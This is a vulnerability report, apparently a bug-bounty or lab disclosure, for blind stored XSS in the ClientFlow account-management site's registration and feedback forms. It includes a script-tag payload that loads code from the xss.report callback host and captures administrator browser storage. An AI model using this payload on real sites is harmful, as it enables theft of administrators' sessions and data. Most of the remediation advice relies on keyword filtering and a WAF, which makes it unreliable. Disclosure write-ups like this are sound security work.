## Title
Blind XSS - ClientFlow Account Management

## Description
**Affected URL:** https://clientflow.pwnedbox.site/

ClientFlow accepts user-controlled input in the account registration Full name field and the feedback form's Name and Your feedback fields. The submitted input is stored and later displayed in account and administrative pages without proper output encoding.

A script payload submitted through these fields can execute when the stored content is viewed in the administrative feedback interface. This results in Blind Stored Cross-Site Scripting (Blind XSS), confirmed through the XSS.Report callback.

## Steps to Reproduce

1. Open the account registration page: https://clientflow.pwnedbox.site/register.php
2. Enter the following payload in the Full name field: `"><script src=https://xss.report/c/priyanshxop></script>`
3. Enter a valid email address and password, then click **Create Account**.
4. Observe that the account is created successfully and the submitted name is displayed on the account page.
5. Navigate to the Feedback page:
   https://clientflow.pwnedbox.site/feedback.php
6. Enter the same payload in the Name field and Your feedback field.
7. Submit the feedback.
8. Sign in to the administrative dashboard using the demo credentials displayed on the admin login page.
9. Open the submitted feedback entry from the admin feedback section.
10. Check the XSS.Report dashboard and observe callbacks associated with the ClientFlow administrative feedback page, confirming that the stored payload was triggered.


## POC (Proof of Concept)

**Screenshot 1:** Payload entered in the Full name field during account registration.

<img width="1918" height="972" alt="image" src="https://github.com/user-attachments/assets/0b00b19d-07ca-411c-9d94-0d65d08fe3e8" />

**Screenshot 2:** Account created successfully; the submitted name is displayed on the account page.

<img width="1915" height="963" alt="image" src="https://github.com/user-attachments/assets/05f83993-1a3b-4cca-96a4-c231cfbb8c7f" />

**Screenshot 3:** Payload entered in the feedback form's Name and Your feedback fields.

<img width="1918" height="961" alt="image" src="https://github.com/user-attachments/assets/c26c342d-3617-41cc-85b2-a62ab0d77fcd" />

**Screenshot 4:** Feedback submission accepted successfully.

<img width="1911" height="945" alt="image" src="https://github.com/user-attachments/assets/15c4865b-f80b-475c-8d2d-5d51016eb9a3" />

**Screenshot 5:** Admin login page showing the demo credentials.

<img width="1918" height="962" alt="image" src="https://github.com/user-attachments/assets/c88f56f9-6fbe-4ce4-b558-b7aebce990ef" />

**Screenshot 6:** Administrative feedback detail page displaying the submitted sender and message content.

<img width="1916" height="963" alt="image" src="https://github.com/user-attachments/assets/dd76f2df-7ebe-41c1-9e8c-3b6ee1ef417d" />

**Screenshot 7:** XSS.Report dashboard showing callbacks associated with the ClientFlow administrative feedback page.

<img width="1918" height="958" alt="image" src="https://github.com/user-attachments/assets/d5ca39ad-8110-4dc1-ac1a-5347830a394f" />

**Screenshot 8:** XSS.Report callback details showing captured browser data, including session storage, local storage, and DOM information.

<img width="1918" height="958" alt="image" src="https://github.com/user-attachments/assets/288a0d51-f78f-44b6-9b38-3125904f00c0" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.

## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
